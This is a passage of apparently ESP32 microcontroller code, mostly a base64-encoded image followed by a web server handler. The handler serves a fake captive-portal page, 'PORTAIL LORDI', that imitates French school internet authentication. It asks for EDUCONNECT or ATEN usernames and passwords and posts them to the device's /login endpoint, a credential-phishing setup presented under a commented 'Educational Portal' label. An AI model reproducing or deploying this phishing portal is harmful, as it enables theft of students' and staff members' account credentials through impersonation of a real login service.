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'/>
            <div class="text-content">
                <p>Merci de vous authentifier pour accéder à internet.</p>
                <p>Utilisez votre compte EDUCONNECT ou ATEN.</p>
            </div>
        </div>
        <div class="right-side">
            <h3>PORTAIL LORDI</h3>
            <form action="/login" method="post">
                <input type="text" name="username" placeholder="prenom.nom" required>
                <input type="password" name="password" placeholder="••••••••••••••" required>
                <button type="submit" class="login-button">Login</button>
            </form>
        </div>
    </div>
</body>
</html>
    )";
    webServer.send(200, "text/html", html);
  });

  webServer.begin();
  portalActive = true;
  // Serial2.println("ESP32: Educational Portal Started");
}